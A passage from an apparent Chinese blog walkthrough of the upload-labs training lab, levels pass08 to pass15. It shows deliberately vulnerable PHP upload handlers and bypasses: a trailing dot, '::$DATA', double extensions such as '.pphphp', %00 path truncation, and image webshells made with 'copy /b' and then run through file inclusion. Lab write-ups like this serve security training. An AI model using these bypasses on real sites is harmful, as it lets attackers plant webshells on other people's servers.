class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对比源码发现少了删除文件名末尾的点的函数</p><blockquote><p>$file_name = deldot($file_name);//删除文件名末尾的点</p></blockquote><p>没有对后缀名进行去’.’处理，利用windows特性，会自动去掉后缀名中最后的’.’，上传后文件名后缀的点会被去除，所以可在抓包在后缀名后加’.’绕过</p><h1 id="pass08"><a href="#pass08" class="headerlink" title="pass08"></a>pass08</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对比源码发现缺少了去除字符串的函数</p><blockquote><p>$file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA</p></blockquote><p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。</p><p>示例 - 访问：$ DATA备用数据流</p><blockquote><p>C：\&gt;启动c：\ textfile.txt :: $ DATA</p></blockquote><p>具体参考<a href="https://www.owasp.org/index.php/Windows_::DATA_alternate_data_stream" target="_blank" rel="noopener">https://www.owasp.org/index.php/Windows_::DATA_alternate_data_stream</a></p><p>其实我还是没完全懂这是啥玩意…</p><p>好像就是另一个访问这个文件的方法</p><p>回到这道题,解决的方法就是在后缀后面加上::$DATA</p><img src="/2019/08/10/upload-labs-master/DATA.png"><h1 id="pass09"><a href="#pass09" class="headerlink" title="pass09"></a>pass09</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我觉得这题有点考脑洞了…</p><img src="/2019/08/10/upload-labs-master/09tips.png" title="这个提示可以吧?有没有醍醐灌顶的感觉?"><p>从源码中可以看到,deldot函数删除文件名末尾的点,最后的trim函数首尾去空格,就没有了对点的处理了</p><p>所以姿势就是在文件名后面加点空格点’. .’</p><h1 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下源码的str_ireplace函数可以知道,它把符合黑名单的后缀去掉了,因此可以想一些比较奇怪的后缀,使经过这个函数之后变成我们需要的后缀</p><p>比如</p><blockquote><p>.pphphp</p></blockquote><p>或者</p><blockquote><p>.phppphphp</p></blockquote><p>类似这样的双重文件名绕过</p><h1 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>substr — 返回字符串的子串</p><blockquote><p>string substr( string $string, int $start[, int $length] )</p><blockquote><p>返回字符串 string 由 start 和 length 参数指定的子字符串。 </p></blockquote></blockquote></blockquote><blockquote><p>strrpos — 计算指定字符串在目标字符串中最后一次出现的位置</p><blockquote><p>int strrpos( string $haystack, string $needle[, int $offset = 0] )</p><blockquote><p>返回字符串 haystack 中 needle 最后一次出现的数字位置。注意 PHP4 中，needle 只能为单个字符。如果 needle 被指定为一个字符串，那么将仅使用第一个字符。</p></blockquote></blockquote></blockquote><p><strong>注意上面的substr函数,length是非必须的,因此strrpos起到的作用是start起始位置</strong></p><p>相关函数拓展:</p><blockquote><p>注意:strrpos() 函数对大小写敏感。<br>stripos() - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）<br>strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）<br>strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）<br>语法<br>strrpos(string,find,start)<br>参数  描述<br>string  必需。规定被搜索的字符串。<br>find    必需。规定要查找的字符。<br>start   可选。规定在何处开始搜索。</p></blockquote><p>但是理解了这两个函数对解题好像没什么大帮助</p><p>提示:</p><img src="/2019/08/10/upload-labs-master/11tips.png"><p>上传路径可控,再看看涉及到上传路径的源码</p><blockquote><p>$img_path = $_GET[‘save_path’].”/“.rand(10, 99).date(“YmdHis”).”.”.$file_ext;</p></blockquote><p>看了大佬的笔记之后,得知这路径没有经过处理就直接拼接上去了,可以利用00截断绕过</p><p>抓包修改:</p><img src="/2019/08/10/upload-labs-master/filename.png" title="上传的时候选择的文件"><img src="/2019/08/10/upload-labs-master/savepath1.png" title="一开始抓到的savepath"><img src="/2019/08/10/upload-labs-master/savepath2.png" title="修改后的savepath"><p>有点奇怪的是我上传不了…显示上传失败..可能跟php版本有关系</p><blockquote><p>可以使用 %00 截断的条件<br>1、PHP 版本 &lt; 5.3.4<br>2、php.ini 中 magic_quotes_gpc=off</p></blockquote><p>(但是我调的php版本是5.2.17,按道理是没问题的,暂时先不管了)</p><h1 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对比pass11的源码可以发现img_path处的不同,pass11的是GET,pass12的是POST</p><p>操作类似<a href="https://blog.csdn.net/zpy1998zpy/article/details/80545408" target="_blank" rel="noopener">https://blog.csdn.net/zpy1998zpy/article/details/80545408</a></p><img src="/2019/08/10/upload-labs-master/12savepath.png"><img src="/2019/08/10/upload-labs-master/12modifiedsavepath.png" title="修改为00"><img src="/2019/08/10/upload-labs-master/12modified.png" title="修改好之后的savepath"><p>显示不出来的就是00了</p><p>然后点击forward即可</p><h1 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h1><img src="/2019/08/10/upload-labs-master/13task.png"><p>任务有点强啊</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>unpack(format,data)</p><blockquote><p>format必须,解包数据时所使用的格式<br>data非必需.被解包的二进制数据</p></blockquote></blockquote><blockquote><p>intval — 获取变量的整数值</p><blockquote><p>int intval( mixed $var[, int $base = 10] )</p><blockquote><p>通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1</p></blockquote></blockquote></blockquote><p>上传后门.php改为.jpg的图片,抓包改后缀,失败</p><p>上传真图片,在抓包后再写一个phpinfo,配合文件包含,成功</p><img src="/2019/08/10/upload-labs-master/addphpinfo.png"><img src="/2019/08/10/upload-labs-master/include.png"><img src="/2019/08/10/upload-labs-master/phpinfo.png"><p>值得注意的是GET传参时候的URL,要加上../才行</p><p>制作图片马的方法还有其他的,比如</p><blockquote><p>cmd中执行</p><blockquote><p>copy image.jpg /b + webshell.php /a image.jpg</p><blockquote><p>/b:指定二进制格式复制、合并文件，用于图像或者声音类文件<br>/a:指定以ascii格式复制、合并文件，用于txt等文本类文件</p></blockquote></blockquote></blockquote><h1 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h1><p>pass14的任务也是上传图片马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>getimagesize — 取得图像大小</p></blockquote><blockquote><p>image_type_to_extension — 取得图像类型的文件后缀</p><blockquote><p>string image_type_to_extension( int $imagetype[, bool $include_dot = TRUE] )</p><blockquote><p>imagetype:IMAGETYPE_XXX 系列常量之一。<br>include_dot:是否在后缀名前加一个点。默认是 TRUE</p></blockquote></blockquote></blockquote><p>像pass13那样操作是可以的…</p><h1 id="pass15"><a href="#pass15" class="headerlink" title="pass15"></a>pass15</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 